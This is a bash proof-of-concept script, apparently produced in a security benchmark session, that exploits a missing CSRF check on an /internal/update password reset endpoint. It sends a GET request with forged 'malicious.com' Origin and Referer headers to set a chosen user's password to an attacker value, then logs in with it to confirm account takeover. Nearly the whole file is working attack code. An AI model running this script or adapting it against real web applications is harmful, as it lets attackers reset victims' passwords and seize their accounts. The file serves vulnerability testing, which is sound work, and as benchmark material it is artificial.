#!/bin/bash
# POC: Demonstrates CSRF attack on the /internal/update password reset endpoint by sending a cross-origin request without CSRF token validation
# Target: ./repo
# Created: 2025-11-10T14:52:21.735Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# CSRF Attack POC on Password Reset Endpoint
# This script demonstrates a CSRF vulnerability where an attacker can reset
# any user's password by making a request from a malicious cross-origin website

TARGET_URL="${1:-http://localhost:3000}"
TARGET_USER="${2:-testuser}"
ATTACKER_PASSWORD="${3:-csrf_hacked_password}"

echo "[*] CSRF Password Reset Attack POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Target User: $TARGET_USER"
echo "[*] New Password: $ATTACKER_PASSWORD"
echo ""

# Step 1: Simulate attacker sending request from different origin
# This is what would happen if an admin visited a malicious webpage
# The browser automatically includes credentials (cookies) in cross-origin requests
# when the endpoint uses GET method without SameSite=Strict

echo "[*] Step 1: Sending CSRF attack request from malicious cross-origin domain"
echo "[*] Simulating request from: http://malicious.com"
echo ""

# Send GET request with Origin header indicating cross-site origin
# The server should reject this if CSRF protections are in place
CSRF_RESPONSE=$(curl -s -w "\n%{http_code}" \
  -H "Origin: http://malicious.com" \
  -H "Referer: http://malicious.com/evil-page.html" \
  -H "User-Agent: Mozilla/5.0" \
  "$TARGET_URL/internal/update?username=$TARGET_USER&newpassword=$ATTACKER_PASSWORD")

HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$CSRF_RESPONSE" | head -n-1)

echo "[*] CSRF Request sent:"
echo "GET /internal/update?username=$TARGET_USER&newpassword=$ATTACKER_PASSWORD HTTP/1.1"
echo "Origin: http://malicious.com"
echo "Referer: http://malicious.com/evil-page.html"
echo ""

echo "[*] Response Status: $HTTP_CODE"
echo "[*] Response Body: $RESPONSE_BODY"
echo ""

# Check if CSRF protection is bypassed
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
  echo "[!] VULNERABILITY CONFIRMED: Server accepted password reset from cross-origin request!"
  echo "[!] Expected: 403 Forbidden or CSRF token validation error"
  echo "[!] Actual: $HTTP_CODE - Request was processed"
  echo ""
  
  # Step 2: Verify the password was actually reset
  echo "[*] Step 2: Attempting to login with the new password to verify reset"
  echo ""
  
  LOGIN_RESPONSE=$(curl -s -w "\n%{http_code}" \
    -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$TARGET_USER&password=$ATTACKER_PASSWORD")
  
  LOGIN_HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)
  LOGIN_BODY=$(echo "$LOGIN_RESPONSE" | head -n-1)
  
  echo "[*] Login attempt with new password:"
  echo "POST /login"
  echo "username=$TARGET_USER&password=$ATTACKER_PASSWORD"
  echo ""
  echo "[*] Login Response Status: $LOGIN_HTTP_CODE"
  
  if [ "$LOGIN_HTTP_CODE" = "302" ] || echo "$LOGIN_BODY" | grep -q "dashboard\|profile\|home"; then
    echo "[!] CRITICAL: Password was successfully reset via CSRF and login succeeded!"
    echo "[!] Account takeover possible without user authentication"
    exit 0
  else
    echo "[*] Login with new password: $LOGIN_HTTP_CODE"
    echo "[*] Note: Password may have been reset, but login verification inconclusive"
    exit 0
  fi
else
  echo "[-] Unexpected response code: $HTTP_CODE"
  echo "[-] CSRF protection may be in place or endpoint not accessible"
  exit 1
fi